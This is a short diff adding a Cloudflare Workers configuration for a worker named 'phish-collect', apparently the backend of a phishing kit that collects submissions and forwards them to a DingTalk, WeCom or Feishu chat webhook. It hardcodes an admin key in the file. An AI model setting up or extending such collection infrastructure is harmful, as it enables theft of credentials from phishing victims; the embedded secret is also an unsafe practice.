@@ -1,0 +1,11 @@
+name = "phish-collect"
+main = "collect.js"
+compatibility_date = "2024-12-01"
+compatibility_flags = ["nodejs_compat"]
+
+[vars]
+# 管理面板密钥
+ADMIN_KEY = "PhishKitAdmin2024!@#RandomKey32Char"
+
+# Webhook 地址（钉钉/企微/飞书群机器人）
+WEBHOOK_URL = ""
